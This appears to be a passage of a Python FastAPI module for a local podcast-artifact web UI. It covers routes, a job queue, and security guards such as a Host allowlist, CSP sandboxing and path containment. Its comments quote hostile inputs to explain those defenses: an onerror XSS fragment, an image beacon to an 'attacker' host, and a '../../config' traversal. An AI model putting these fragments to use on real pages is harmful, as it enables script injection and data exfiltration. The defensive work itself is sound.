"""
FastAPI application for the WHYcast web UI (ADR-008, TASK-002/TASK-003).

Read-only browser over ``podcasts/``: an episode overview with an artifact
status matrix, a detail page per episode, the list of files that matched no
episode, and a small JSON API. Phase 2 adds the job queue - a way to *ask* for
pipeline work and watch it happen - without changing the rule that matters:
nothing here writes episode artifacts (ADR-008: "the web layer must not write
episode artifacts directly").

Layering
--------
This module owns HTTP and nothing else. The filesystem is the source of truth,
:mod:`whycast.episodes` interprets it, and :mod:`webui.db` caches that reading
in a throwaway SQLite index. The app only ever asks ``db`` for episodes; it
never walks the directory itself and never builds a path from user input.

Jobs, phase 2 (TASK-003)
------------------------
Same layering, one level further out. ``POST /api/jobs`` writes a row through
:mod:`webui.jobs` and returns; a separate worker process claims it - strictly
one at a time - and runs it as a ``python -m webui.runner <id>`` child. So:

* this module never imports the pipeline, never spawns a process, and never
  holds the GPU. A CUDA out-of-memory kill takes down a child, not the server;
* ``GET /api/jobs/{id}/events`` *tails* the file that child writes. The queue
  and the log are the only interface between the two halves, which is why the
  web server can be restarted mid-transcription without disturbing the run;
* cost is a property of the job *type* (``JOB_TYPES[...]["cost"]``), reported
  on every job and job-type response and never inferred from request data, so
  there is no route that starts a paid job without the caller naming it.

``base_name`` in a job request is the same opaque lookup key it is everywhere
else here: it is resolved through the index before the row is written, so a
name the scanner never produced cannot reach the runner.

Speaker mappings, phase 3 (TASK-004)
------------------------------------
One page and three routes write a file, which is the single exception to the
sentence above - and a deliberate one. ``<base>_speakers.json`` is pipeline
*input*, not a result: :data:`whycast.episodes.INPUT_KINDS` says so, ADR-010
defines it, and :func:`whycast.pipeline.speakers.speaker_assignment_step` reads
it instead of paying a reasoning model to decide who ``SPEAKER_00`` is. ADR-008
forbids this layer writing episode *artifacts* - the things the pipeline
generates and can regenerate - because two writers of one output is how a
half-written file happens. A human input file has exactly one writer, which is
the human, and this is the form they type it into.

So: saving a mapping is free and writes one small JSON file (atomically, with a
``.bak``, per ADR-009). Applying it is the ``speakers`` job, enqueued through
``POST /api/jobs`` like every other paid action. Nothing on that page starts a
job by itself, and the one route that *deletes* a mapping
(``POST .../speakers/discard``) is reached only on purpose - it is human work,
and the pipeline may never throw it away on its own.

Security (ADR-008)
------------------
No filesystem path is ever accepted from a request. ``base_name``, ``kind`` and
``fmt`` are opaque lookup keys:

* ``kind`` and ``fmt`` are rejected unless they are in the scanner's vocabulary
  (:data:`whycast.episodes.ARTIFACT_KINDS` / ``ARTIFACT_FORMATS``), so they can
  never be anything but a fixed word.
* ``base_name`` is only ever passed to SQLite as a query parameter. The route
  uses the plain ``{base_name}`` converter, which refuses to match ``/`` at
  all, so ``../../config`` never reaches a handler.
* The path to open comes back *from the index*, and is then re-checked with
  :func:`os.path.realpath` against the configured podcast directory
  (:func:`_safe_file`). A file that resolves outside it - a stale index row, a
  symlink, a directory that moved - is a 404, not a read.

Untrusted artifact content
--------------------------
Artifacts are not trusted input. They are LLM output derived from podcast and
feed text (so: prompt-injectable) and editable by anything that can write to
``podcasts/``. They are therefore never merged into a page of this app.

The episode page links each artifact into a **sandboxed iframe**, so the
browser navigates to it instead of splicing it into a live document. That is
what makes :data:`_ARTIFACT_HEADERS` effective: a response header governs the
document created from that response, so it applies to a navigation and does
*not* apply to a string handed to ``innerHTML``. An earlier version fetched
artifacts with htmx and swapped them in, which made the ``sandbox`` header
inert and let ``<img src=x onerror=...>`` run in this app's origin - for every
format, because htmx parses any response body as HTML regardless of
``Content-Type``. Do not reintroduce a swap-based artifact viewer.

* Artifact responses: ``Content-Security-Policy: sandbox`` (opaque origin, no
  scripting) plus ``default-src 'none'``, so hostile content also cannot beacon
  data out to a remote host. ``X-Content-Type-Options: nosniff`` stops a
  browser re-typing a text artifact into something executable.
* The app's own pages: a CSP with ``script-src 'self'`` and no
  ``'unsafe-inline'``, which is why all script lives in ``/static/app.js``.

Network exposure
----------------
There is no authentication (ADR-008 assumes localhost, single user), so the
loopback bind is the trust boundary - and a bind address alone does not stop
DNS rebinding, where a remote page resolves its own name to 127.0.0.1 and then
talks to this app same-origin. :func:`_register_guards` therefore checks the
``Host`` header against an allowlist and rejects unsafe cross-origin requests,
which is what makes "localhost only" actually true.

Secrets (``OPENAI_API_KEY``, the HuggingFace token) are never read here and no
route returns environment variables. The one place configuration leaves this
module is :data:`META_KEYS`, an explicit allowlist of index statistics
(ADR-008 Must: "an allowlist of visible keys").

Concurrency
-----------
Every handler is ``async def``. ``webui.db`` hands out one
:class:`sqlite3.Connection`, opened during startup and shared by every request.

That connection is safe to use from any thread: :func:`webui.db.init_db` opens
it with ``check_same_thread=False``, and every public function in that module
serialises on its module-level ``_LOCK`` (which also keeps a read from landing
inside ``rescan``'s open transaction). So sync (``def``) handlers would work
too - they would simply run in anyio's worker threadpool.

Async is still the right choice, just for a duller reason: the blocking work
here is a local SQLite read and a file stat for one user on localhost, and
paying a threadpool hop for that buys nothing. Keep any handler that grows real
blocking work (phase 2) out of the event loop instead.
"""

from __future__ import annotations

import ipaddress
import json
import logging
import difflib
import os
import re
import sqlite3
import time
import urllib.parse
from contextlib import asynccontextmanager
from typing import Any, AsyncIterator, Dict, List, Optional, Tuple

import anyio
from fastapi import FastAPI, HTTPException, Query, Request
from fastapi.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    PlainTextResponse,
    RedirectResponse,
    Response,
    StreamingResponse,
)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from jinja2 import TemplateNotFound
from starlette.exceptions import HTTPException as StarletteHTTPException

import webui as webui_package
from webui import db, jobs, snapshots

# The same import :mod:`webui.jobs` makes, for the same reason: every use of
# the shared connection serialises on this lock, which is also what keeps a
# read from landing inside ``rescan``'s open transaction. This module only
# needs it for the one raw query it runs itself (:func:`_queue_or_503`);
# everything else goes through ``db`` or ``jobs``, which take it themselves.
from webui.db import _LOCK as _DB_LOCK
from whycast.episodes import (
    ARTIFACT_FORMATS,
    ARTIFACT_KINDS,
    SPEAKER_MAP_SUFFIX,
    formats_for_kind,
)
from whycast.errors import ConfigurationError, WhycastError
from whycast.io_utils import BACKUP_SUFFIX, atomic_write_text

# The *module*, not its constants. ``whycast.config`` computes VOCABULARY_FILE
# and the PROMPT_*_FILE paths at import time from the repository root and offers
# no environment override, so a from-import would bake the operator's live files
# into this module - and the editor tests could not point anywhere else, which
# means running them would rewrite the real vocabulary. Reading the attribute
# per request costs nothing and keeps the input editors testable.
from whycast import config as whycast_config

__all__ = [
    "DEFAULT_ALLOWED_HOSTS",
    "DEFAULT_HOST",
    "DEFAULT_PORT",
    "DEFAULT_PODCAST_DIR",
    "EPISODE_ACTION_TYPES",
    "EPISODE_JOB_HISTORY",
    "JOB_LIST_LIMIT",
    "MAX_EDITOR_BODY_BYTES",
    "MAX_JOB_BODY_BYTES",
    "MAX_SPEAKER_LABELS",
    "MAX_SPEAKER_NAME_CHARS",
    "META_KEYS",
    "PROMPT_NAMES",
    "PROMPT_SPECS",
    "SPEAKER_APPLY_JOB",
    "SPEAKER_CONTEXT_CHARS",
    "SPEAKER_CONTEXT_LINES",
    "SPEAKER_FORM_PREFIX",
    "SSE_HEARTBEAT_SECONDS",
    "SSE_POLL_SECONDS",
    "VOCABULARY_APPLY_JOB",
    "allowed_hosts_from_env",
    "create_app",
    "app",
    "db_path_from_env",
    "host_from_env",
    "is_loopback_host",
    "job_types_payload",
    "podcast_dir_from_env",
    "port_from_env",
]

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration (ADR-007: environment variables, no parallel config store)
# ---------------------------------------------------------------------------

#: Repository root: the parent of the ``webui`` package.
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

#: Both defaults come from the modules that own the thing being defaulted, so
#: there is exactly one answer to "where does the index live" no matter which
#: entry point runs.
DEFAULT_PODCAST_DIR = db.DEFAULT_PODCAST_DIR
DEFAULT_DB_PATH = db.DEFAULT_DB_PATH

#: Loopback by default. ADR-008 Decision Contract: "The web server must bind to
#: 127.0.0.1 by default." Widening this is a deliberate act by the operator.
#: Defined in :mod:`webui` and re-exported here: ``python -m webui`` needs them
#: for its ``--help`` text before it is allowed to import this module (see the
#: package docstring), and one definition beats two that can drift.
DEFAULT_HOST = webui_package.DEFAULT_HOST
DEFAULT_PORT = webui_package.DEFAULT_PORT

_TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
_STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")

#: Keys from :func:`webui.db.get_meta` that may be shown in the UI or returned
#: by the API. An allowlist, never a denylist (ADR-008 Must): a key the index
#: grows later is invisible until someone adds it here on purpose, so no
#: configuration value can leak by being added upstream. These are index
#: statistics - counts, timestamps, the directory being indexed - and contain
#: no credentials.
#:
#: Kept in step with :func:`webui.db.get_meta`; a key that module adds later is
#: dropped here until it has been looked at.
META_KEYS = (
    "schema_version",
    "last_scan",
    "last_scan_iso",
    "podcast_dir",
    "database_path",
    "episode_count",
    "artifact_count",
    "unmatched_count",
    "artifact_kinds",
)

#: Content types served per artifact format. Text formats are served as plain
#: text so the browser shows them; only ``html`` is served as HTML, sandboxed.
_ARTIFACT_MEDIA_TYPES = {
    "txt": "text/plain; charset=utf-8",
    "wiki": "text/plain; charset=utf-8",
    "md": "text/plain; charset=utf-8",
    "html": "text/html; charset=utf-8",
    # Only the speaker mapping is json (ADR-010), and it is the one artifact a
    # person edits rather than reads, so a browser that pretty-prints it helps.
    "json": "application/json; charset=utf-8",
}

_AUDIO_MEDIA_TYPES = {
    ".mp3": "audio/mpeg",
    ".m4a": "audio/mp4",
    ".wav": "audio/wav",
}

#: Sent with every artifact response.
#:
#: ``sandbox`` with no allow-tokens puts the document in a unique opaque origin
#: with scripting disabled, so an HTML artifact cannot reach the app's origin,
#: its DOM, or its cookies. This works because the episode page *navigates* an
#: iframe to the artifact: a response CSP governs the document made from that
#: response. It would do nothing at all if the body were fetched and assigned
#: to ``innerHTML`` (see the module docstring).
#:
#: ``default-src 'none'`` is the second half: scripting is already off, but
#: without it a hostile artifact could still exfiltrate through a plain
#: ``<img src="https://attacker/?...">``. Inline styles stay allowed so that
#: generated blog HTML still renders as it was written.
#: ``frame-ancestors`` names this server's own origin literally, and must not be
#: ``'self'``. ``sandbox`` puts the artifact in an *opaque* origin, and ``'self'``
#: means "the same origin as this resource" - which an opaque origin can never
#: match, so the two directives together forbid every embedder including us.
#: Firefox enforces that to the letter ("Firefox Can't Open This Page ... if
#: another site has embedded it") while Chrome lets it through, which is how it
#: passed review and still broke in the browser the owner actually uses. A host
#: source is matched against the *embedder's* URL instead, so naming the origin
#: works where ``'self'`` cannot.
_ARTIFACT_CSP = (
    "sandbox; default-src 'none'; img-src data:; style-src 'unsafe-inline'; "
    "base-uri 'none'; form-action 'none'; frame-ancestors {origin}"
)

_ARTIFACT_HEADERS = {
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer",
}


def _artifact_headers(request: Request) -> Dict[str, str]:
    """Artifact response headers, with this server's origin in the policy."""
    headers = dict(_ARTIFACT_HEADERS)
    headers["Content-Security-Policy"] = _ARTIFACT_CSP.format(
        origin=_own_origin(request)
    )
    return headers

#: Sent with every response this app renders itself. No ``'unsafe-inline'`` for
#: scripts: all script is in ``/static/app.js`` so that this can hold. Inline
#: *styles* are allowed because the built-in error page carries its own
#: ``<style>`` block and must render even when templates are unavailable.
_PAGE_HEADERS = {
    "Content-Security-Policy": (
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; media-src 'self'; frame-src 'self'; "
        "object-src 'none'; base-uri 'none'; form-action 'self'; "
        "frame-ancestors 'none'"
    ),
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "no-referrer",
}

#: Host headers accepted when bound to loopback. A bind address does not stop
#: DNS rebinding: a remote page can point its own name at 127.0.0.1 and then
#: reach this app as same-origin. Checking Host is what closes that, and it
#: matters more here than usual because there is no authentication.
#:
#: ``testserver`` is what Starlette's TestClient sends.
DEFAULT_ALLOWED_HOSTS = ("127.0.0.1", "localhost", "::1", "testserver")

#: Methods that may change something. Only these get the cross-origin check;
#: GET/HEAD stay reachable so an artifact link keeps working from anywhere.
_UNSAFE_METHODS = frozenset({"POST", "PUT", "PATCH", "DELETE"})

_FMT_ORDER = {fmt: i for i, fmt in enumerate(ARTIFACT_FORMATS)}

# ---------------------------------------------------------------------------
# Job queue / SSE tuning (ADR-008 phase 2)
# ---------------------------------------------------------------------------

#: How often the SSE tailer looks for new lines in a job's ``events.jsonl`` and
#: re-checks the job's status. 250 ms reads as "live" to a human and costs one
#: ``read()`` from the current offset plus one primary-key lookup per tick, both
#: on a thread so the event loop is never the thing that waits.
SSE_POLL_SECONDS = 0.25

#: A comment line (``: heartbeat``) is sent when nothing else has gone out for
#: this long. A queued job produces no events at all, and a transcription step
#: can run for many minutes in silence; without traffic an intermediary or an
#: idle browser drops the connection and the log appears to freeze.
SSE_HEARTBEAT_SECONDS = 15.0

#: Default ``limit`` for ``GET /api/jobs`` and the dashboard, and the ceiling a
#: caller may ask for. Job history is unbounded; a page is not.
JOB_LIST_LIMIT = 50
MAX_JOB_LIST_LIMIT = 500

#: Largest body ``POST /api/jobs`` will read. A job request is a type, an
#: episode key and a few options; 64 KiB is roughly a thousand times what the
#: UI ever sends. Without a cap the body is buffered in full and then written
#: into the ``jobs`` table, which shares a SQLite file with the episode index.
MAX_JOB_BODY_BYTES = 64 * 1024

#: The 413 wording for each body cap. Each route's message is part of its own
#: contract - the editors apologise in prose the operator is reading, the job
#: API states a limit a client is parsing - so the shared reader
#: (:func:`_read_capped_body`) is told which one to use rather than composing
#: one for everybody.
_JOB_BODY_TOO_LARGE = f"Job request body is larger than {MAX_JOB_BODY_BYTES} bytes"
_SPEAKER_BODY_TOO_LARGE = f"Request body is larger than {MAX_JOB_BODY_BYTES} bytes"

#: How far back the episode page looks for jobs that targeted this episode.
#: :func:`webui.jobs.list_jobs` filters by status, not by episode, so this is a
#: bounded newest-first window filtered in Python - "recent runs for this
#: episode", not the complete history. Deliberate: one indexed read with a hard
#: ceiling beats growing a query API for a sidebar.
EPISODE_JOB_HISTORY = 200

#: Sent with every SSE response.
#:
#: ``no-transform`` and ``X-Accel-Buffering: no`` both say the same thing to two
#: different audiences: do not buffer this. A proxy that collects the stream
#: into chunks turns a live log into a single burst at the end, which is the one
#: property this endpoint exists to provide.
_SSE_HEADERS = {
    "Cache-Control": "no-cache, no-store, no-transform",
    "X-Accel-Buffering": "no",
    "Connection": "keep-alive",
}

def _artifact_problem(request: Request, message: str) -> PlainTextResponse:
    """A 404 the artifact frame can actually display.

    Raising HTTPException here produced a JSON error carrying the *page*
    headers - ``X-Frame-Options: DENY`` and ``frame-ancestors 'none'`` - so the
    browser refused to render it inside the artifact frame and showed its own
    "Firefox Can't Open This Page" instead. The reader was told a security
    policy had intervened, when the truth was simply that a job had moved the
    file aside a moment earlier.

    So the error is served like an artifact: same framable headers, plain text,
    saying what happened and what to do about it.
    """
    return PlainTextResponse(
        message, status_code=404, headers=_artifact_headers(request)
    )


def podcast_dir_from_env() -> str:
    """Podcast directory from ``WHYCAST_PODCAST_DIR``, else the repo default."""
    return os.path.abspath(os.environ.get("WHYCAST_PODCAST_DIR") or DEFAULT_PODCAST_DIR)


def db_path_from_env() -> str:
    """Index database path from ``WHYCAST_WEBUI_DB``, else the repo default."""
    return os.path.abspath(os.environ.get("WHYCAST_WEBUI_DB") or DEFAULT_DB_PATH)


def host_from_env() -> str:
    """Bind address from ``WHYCAST_WEBUI_HOST``, else :data:`DEFAULT_HOST`."""
    return os.environ.get("WHYCAST_WEBUI_HOST") or DEFAULT_HOST


def is_loopback_host(host: str) -> bool:
    """True when ``host`` only accepts connections from this machine."""
    if host in ("localhost", ""):
        return True
    try:
        return ipaddress.ip_address(host.strip("[]")).is_loopback
    except ValueError:
        return False


def allowed_hosts_from_env(bind_host: Optional[str] = None) -> List[str]:
    """Host headers this app will answer to.

    ``WHYCAST_WEBUI_ALLOWED_HOSTS`` (comma-separated) overrides everything -
    needed if the operator reaches the UI by a name we cannot guess, such as a
    machine name or a reverse proxy's.

    Otherwise: on a loopback bind, :data:`DEFAULT_ALLOWED_HOSTS`. On any other
    bind the operator has deliberately published the UI and will use names we
    cannot enumerate, so the check is disabled rather than left to break the
    server in a way that looks like a bug. ``python -m webui`` already warns
    loudly about binding off-loopback without authentication.
    """
    raw = os.environ.get("WHYCAST_WEBUI_ALLOWED_HOSTS")
    if raw:
        hosts = [item.strip() for item in raw.split(",") if item.strip()]
        if hosts:
            return hosts
    host = host_from_env() if bind_host is None else bind_host
    if not is_loopback_host(host):
        return ["*"]
    return list(DEFAULT_ALLOWED_HOSTS)


def port_from_env() -> int:
    """Bind port from ``WHYCAST_WEBUI_PORT``, else :data:`DEFAULT_PORT`.

    Raises:
        ConfigurationError: if the variable is set but is not a valid port.
    """
    raw = os.environ.get("WHYCAST_WEBUI_PORT")
    if not raw:
        return DEFAULT_PORT
    try:
        port = int(raw)
    except ValueError:
        raise ConfigurationError(
            f"WHYCAST_WEBUI_PORT must be a number, got {raw!r}"
        ) from None
    if not 1 <= port <= 65535:
        raise ConfigurationError(f"WHYCAST_WEBUI_PORT out of range: {port}")
    return port


# ---------------------------------------------------------------------------
# Path safety
# ---------------------------------------------------------------------------


def _safe_file(root: str, candidate: Optional[str]) -> Optional[str]:
    """Return ``candidate`` resolved, if it is a real file inside ``root``.

    This is the only gate between the index and :func:`open`. Both sides are
    put through :func:`os.path.realpath` (so symlinks, junctions, ``..`` and
    short names are collapsed) and :func:`os.path.normcase` (so the check is
    not defeated by casing on NTFS). A prefix test on the normalised strings is
    used rather than :func:`os.path.commonpath`, which raises ``ValueError``
    when the two paths sit on different drives - a live case on this machine,
    where ``podcasts/`` is on D: and ``%TEMP%`` on C:.

    Returns None when the candidate is empty, unreadable, not a regular file,
    or resolves anywhere outside ``root``. Callers turn None into a 404.
    """
    if not candidate:
        return None
    try:
        resolved = os.path.realpath(candidate)
        real_root = os.path.realpath(root)
    except (OSError, ValueError):
        return None

    # Resolve once, above: the value that gets checked is the value that gets
    # returned. Comparing one path and handing back a freshly recomputed one is
    # how a check-then-use bug is born, even where the two happen to agree.
    compare_path = os.path.normcase(resolved)
    # Normalise the root to exactly one trailing separator, which also makes
    # the root directory itself fail the test: it is not a file we serve.
    prefix = os.path.normcase(real_root).rstrip(os.sep) + os.sep

    if not compare_path.startswith(prefix):
        logger.warning(
            "Refusing to serve %r: resolves outside the podcast directory", candidate
        )
        return None
    if not os.path.isfile(resolved):
        return None
    return resolved


# ---------------------------------------------------------------------------
# Index access
#
# These three helpers are the only places that know the shape of the dicts
# webui.db returns. Everything else treats an episode as opaque and hands it
# straight to a template or to JSON, so an integration mismatch is a fix in one
# place rather than in every handler.
# ---------------------------------------------------------------------------


def _artifacts_of(episode: Dict[str, Any]) -> List[Dict[str, Any]]:
    """The artifact rows of an episode dict."""
    return list(episode.get("artifacts") or [])


def _audio_of(episode: Dict[str, Any]) -> Optional[str]:
    """The audio path recorded for an episode, if it has one."""
    return episode.get("audio_path")


def _pick_artifact(
    episode: Dict[str, Any], kind: str, fmt: Optional[str]
) -> Optional[Dict[str, Any]]:
    """Best artifact of ``kind`` for ``episode``, or None.

    Mirrors :meth:`whycast.episodes.Episode.artifact` exactly, and must keep
    doing so: format preference first, then newest file, then path as a
    deterministic tie-break. The mtime term matters on real data - ``ep29`` has
    both ``ep29_speaker_assignment.txt`` and the 36-day-newer
    ``ep29_ts_speaker_assignment.txt``, and ordering by path alone would serve
    the superseded one forever.
    """
    matches = [
        a
        for a in _artifacts_of(episode)
        if a.get("kind") == kind and (fmt is None or a.get("fmt") == fmt)
    ]
    if not matches:
        return None
    return min(
        matches,
        key=lambda a: (
            _FMT_ORDER.get(a.get("fmt"), len(_FMT_ORDER)),
            -(a.get("mtime") or 0.0),
            a.get("path") or "",
        ),
    )


def _public_meta(raw: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    """Filter index metadata down to :data:`META_KEYS`.

    The single point where anything configuration-shaped leaves this module.
    Unknown keys are dropped silently.
    """
    if not raw:
        return {}
    return {key: raw[key] for key in META_KEYS if key in raw}


# ---------------------------------------------------------------------------
# Startup
# ---------------------------------------------------------------------------


def _as_epoch(value: Any) -> Optional[float]:
    """Best-effort read of a stored timestamp as epoch seconds."""
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return float(value)
    if isinstance(value, str):
        try:
            return float(value)
        except ValueError:
            return None
    return None


def _newest_change(podcast_dir: str) -> float:
    """The newest mtime in ``podcast_dir``: the directory itself and its entries.

    The directory's own mtime is not enough. On NTFS (and POSIX) it changes when
    an entry is added, renamed or removed, but *not* when a file is rewritten in
    place - which is exactly what the pipeline does when it regenerates an
    artifact. Judging staleness by the directory alone therefore keeps serving
    the old size and timestamp for a file that has already changed.

    One shallow ``scandir`` over ~800 entries, using the stat data the directory
    walk already carries. Not free, and it does mean a stale index gets stat'ed
    twice (here, then again in the rescan), but it is milliseconds and it runs
    once per startup.
    """
    newest = os.path.getmtime(podcast_dir)
    with os.scandir(podcast_dir) as entries:
        for entry in entries:
            try:
                newest = max(newest, entry.stat().st_mtime)
            except OSError:
                # Unreadable or vanished mid-walk: the rescan reports it.
                continue
    return newest


def _index_is_stale(conn: sqlite3.Connection, podcast_dir: str) -> bool:
    """True when the index should be rebuilt before serving the first request.

    Stale means: never scanned, scanned into an empty index, or scanned before
    anything in the podcast directory last changed. Anything unrecognised in the
    metadata also counts as stale - rescanning costs one directory walk and is
    idempotent, while serving a silently wrong index is a bug the user has to
    notice themselves.
    """
    try:
        meta = _public_meta(db.get_meta(conn))
    except Exception:  # pragma: no cover - defensive; a broken index is stale
        logger.warning("Could not read index metadata; forcing a rescan", exc_info=True)
        return True

    last_scan = _as_epoch(meta.get("last_scan"))
    if last_scan is None:
        return True

    count = meta.get("episode_count")
    if not isinstance(count, int) or count <= 0:
        return True

    try:
        return last_scan < _newest_change(podcast_dir)
    except OSError:
        # The directory is gone or unreadable. Let rescan() report it properly.
        return True


@asynccontextmanager
async def _lifespan(app: FastAPI):
    """Open the index, refresh it when stale, and close it on shutdown.

    A missing or unreadable podcast directory must not stop the server from
    booting: the operator's most likely next move is to look at the UI, and an
    empty page with a logged warning explains more than a stack trace on the
    console. ``POST /api/rescan`` reports the same failure to the caller.
    """
    conn = db.init_db(app.state.db_path)
    app.state.conn = conn
    logger.info(
        "WHYcast web UI index %s over %s", app.state.db_path, app.state.podcast_dir
    )
    # Before the rescan, not after: ``rescan`` opens a transaction and
    # ``ensure_job_schema`` refuses to run DDL inside someone else's. The queue
    # lives in the same database as the index but is *not* disposable - a
    # rescan rebuilds episodes and leaves job history alone.
    try:
        jobs.ensure_job_schema(conn)
    except (WhycastError, sqlite3.Error) as exc:
        # The browser is still worth serving: the read-only half of the app
        # works without a queue, and the job routes will report the failure
        # themselves rather than the server refusing to boot.
        logger.error("Job queue unavailable: %s", exc)
    try:
        if _index_is_stale(conn, app.state.podcast_dir):
            logger.info("Index is stale; rescanning %s", app.state.podcast_dir)
            db.rescan(conn, app.state.podcast_dir)
    except WhycastError as exc:
        logger.warning("Startup rescan failed: %s", exc)
    except OSError as exc:
        logger.warning("Startup rescan failed reading the podcast directory: %s", exc)
    try:
        yield
    finally:
        app.state.conn = None
        try:
            conn.close()
        except Exception:  # pragma: no cover - nothing useful left to do
            logger.debug("Closing the index connection failed", exc_info=True)


# ---------------------------------------------------------------------------
# Application
# ---------------------------------------------------------------------------


def create_app(
    podcast_dir: Optional[str] = None,
    db_path: Optional[str] = None,
) -> FastAPI:
    """Build the FastAPI application.

    Arguments override the environment; both default to the ADR-007 variables
    (``WHYCAST_PODCAST_DIR``, ``WHYCAST_WEBUI_DB``). Building the app opens no
    database and touches no disk - that happens in the lifespan handler, so
    importing this module stays free of side effects and tests can construct an
    app per temporary directory.
    """
    app = FastAPI(
        title="WHYcast web UI",
        version="1",
        summary="Read-only browser over the podcasts directory (ADR-008 phase 1).",
        lifespan=_lifespan,
    )
    app.state.podcast_dir = os.path.abspath(podcast_dir or podcast_dir_from_env())
    app.state.db_path = os.path.abspath(db_path or db_path_from_env())
    app.state.conn = None
    app.state.allowed_hosts = allowed_hosts_from_env()

    templates = Jinja2Templates(directory=_TEMPLATE_DIR)
    app.state.templates = templates

    if os.path.isdir(_STATIC_DIR):
        app.mount("/static", StaticFiles(directory=_STATIC_DIR), name="static")

    _register_guards(app)
    _register_routes(app, templates)
    _register_speaker_routes(app, templates)
    _register_job_routes(app, templates)
    _register_editor_routes(app, templates)
    _register_error_handlers(app, templates)
    return app


def _register_guards(app: FastAPI) -> None:
    """Host allowlist, cross-origin check, and security headers.

    Written out rather than using ``TrustedHostMiddleware`` because that one
    derives the hostname with ``host.split(":")[0]``, which turns the IPv6
    literal ``[::1]:8420`` into ``[``. ``request.url.hostname`` parses it
    properly, so ``--host ::1`` keeps working.
    """

    @app.middleware("http")
    async def guard(request: Request, call_next):
        allowed = getattr(request.app.state, "allowed_hosts", None) or ["*"]
        if "*" not in allowed:
            hostname = request.url.hostname or ""
            if hostname not in allowed:
                # 421 says "you asked the wrong server", which is exactly the
                # case in a DNS-rebinding attempt.
                logger.warning("Rejected request with Host %r", hostname)
                return JSONResponse(
                    {"detail": "Invalid Host header"}, status_code=421
                )

        # Cross-site request forgery: a plain HTML form can POST here without a
        # preflight, so any page the operator visits could trigger it. Browsers
        # attach Origin to unsafe requests; a mismatch is never legitimate.
        # A missing Origin is allowed on purpose - that is curl, not a browser.
        if request.method in _UNSAFE_METHODS:
            origin = request.headers.get("origin")
            if origin and origin != _own_origin(request):
                logger.warning("Rejected cross-origin %s from %r", request.method, origin)
                return JSONResponse(
                    {"detail": "Cross-origin request refused"}, status_code=403
                )

        response = await call_next(request)

        # Artifact responses set their own, far stricter policy. Never overwrite
        # it with the page policy: that would drop the sandbox.
        if "content-security-policy" not in response.headers:
            for header, value in _PAGE_HEADERS.items():
                response.headers.setdefault(header, value)

        # Make the browser revalidate /static instead of guessing.
        #
        # StaticFiles sends ETag and Last-Modified but no Cache-Control, which
        # leaves the browser free to apply heuristic caching. Firefox kept
        # serving a stale app.css after a fix, so a corrected stylesheet looked
        # like a stylesheet that did not work. "no-cache" does not mean "do not
        # cache" - it means "ask first", and the ETag turns that question into a
        # 304 costing nothing. This app is served from localhost; there is no
        # bandwidth argument for guessing.
        if request.url.path.startswith("/static/"):
            response.headers.setdefault("Cache-Control", "no-cache")
        return response


def _own_origin(request: Request) -> str:
    """The origin this request was addressed to, as a browser would spell it."""
    return f"{request.url.scheme}://{request.url.netloc}"


def _conn(request: Request) -> sqlite3.Connection:
    """The index connection, or 503 if the app is not fully started."""
    conn = getattr(request.app.state, "conn", None)
    if conn is None:  # pragma: no cover - only reachable outside the lifespan
        raise HTTPException(status_code=503, detail="Index is not available")
    return conn


def _get_episode_or_404(request: Request, base_name: str) -> Dict[str, Any]:
    """Look ``base_name`` up in the index, or raise 404.

    ``base_name`` is used as a lookup key and nothing else; it is never joined
    into a path.
    """
    episode = db.get_episode(_conn(request), base_name)
    if episode is None:
        raise HTTPException(status_code=404, detail="Episode not found")
    return episode


def _register_routes(app: FastAPI, templates: Jinja2Templates) -> None:
    # -- HTML pages ---------------------------------------------------------

    @app.get("/", response_class=HTMLResponse, name="index")
    async def index(request: Request, search: Optional[str] = Query(None)):
        """Episode overview with the artifact status matrix."""
        conn = _conn(request)
        term = (search or "").strip()
        episodes = db.list_episodes(conn, search=term or None)
        return templates.TemplateResponse(
            request,
            "index.html",
            {
                "episodes": episodes,
                "kinds": ARTIFACT_KINDS,
                "meta": _public_meta(db.get_meta(conn)),
                "search": term,
            },
        )

    @app.get("/episodes/{base_name}", response_class=HTMLResponse, name="episode_detail")
    async def episode_detail(request: Request, base_name: str):
        """One episode: artifact tabs, the audio player, and the job actions.

        The template gets everything it needs to offer "re-run post-processing",
        "re-run speaker assignment" and "reprocess (force)" without knowing what
        those cost: ``episode_actions`` carries the ``cost`` and ``gpu`` flags
        per type, so the warning is rendered from the same source the API
        validates against. Each button posts to ``/api/jobs`` with
        ``{"type": ..., "base_name": ...}``; this route enqueues nothing.
        """
        conn = _conn(request)
        episode = _get_episode_or_404(request, base_name)
        # Best-effort: the artifact browser is the point of this page and must
        # not go dark because the queue is unavailable.
        try:
            episode_jobs = _episode_jobs(conn, episode["base_name"])
            active = jobs.active_job(conn)
        except sqlite3.Error as exc:
            logger.warning("Job queue unreadable on the episode page: %s", exc)
            episode_jobs, active = [], None
        actions = _episode_actions()
        return templates.TemplateResponse(
            request,
            "episode.html",
            {
                "episode": episode,
                "kinds": ARTIFACT_KINDS,
                "meta": _public_meta(db.get_meta(conn)),
                "episode_actions": actions,
                "step_actions": _step_actions(),
                "job_types": job_types_payload(),
                "episode_jobs": episode_jobs,
                "active_job": active,
                # Whether a saved speaker mapping exists, read from disk so the
                # answer cannot be a rescan out of date (ADR-010). On a thread
                # because it resolves a path: one stat is nothing, but
                # os.path.realpath on a network drive can sit in an SMB timeout
                # for seconds, and this process also carries live SSE streams.
                "speaker_map": await anyio.to_thread.run_sync(
                    _speaker_map_summary, request, episode
                ),
            },
        )

    @app.get("/unmatched", response_class=HTMLResponse, name="unmatched")
    async def unmatched(request: Request):
        """Files that belong to no episode - visible, not silently ignored."""
        conn = _conn(request)
        return templates.TemplateResponse(
            request,
            "unmatched.html",
            {
                "unmatched": db.list_unmatched(conn),
                "meta": _public_meta(db.get_meta(conn)),
            },
        )

    # -- JSON API -----------------------------------------------------------

    @app.get("/api/episodes", name="api_episodes")
